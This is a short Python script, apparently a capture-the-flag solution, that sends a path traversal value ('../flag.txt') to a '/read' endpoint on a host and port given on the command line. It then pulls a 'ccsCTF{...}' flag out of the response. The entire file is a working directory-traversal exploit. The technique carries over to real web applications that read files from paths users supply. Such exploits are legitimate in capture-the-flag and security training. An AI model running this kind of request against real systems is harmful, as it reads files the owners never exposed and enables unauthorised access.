#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.12"
# dependencies = []
# ///
"""Standard library only."""
import re
import sys
from urllib.parse import urlencode
from urllib.request import urlopen

query = urlencode({"book": "../flag.txt"})
with urlopen(f"http://{sys.argv[1]}:{int(sys.argv[2])}/read?{query}", timeout=10) as response:
    result = re.search(rb"ccsCTF\{[^}]+\}", response.read())
if result is None:
    raise SystemExit("Flag not received")
print(result.group().decode())
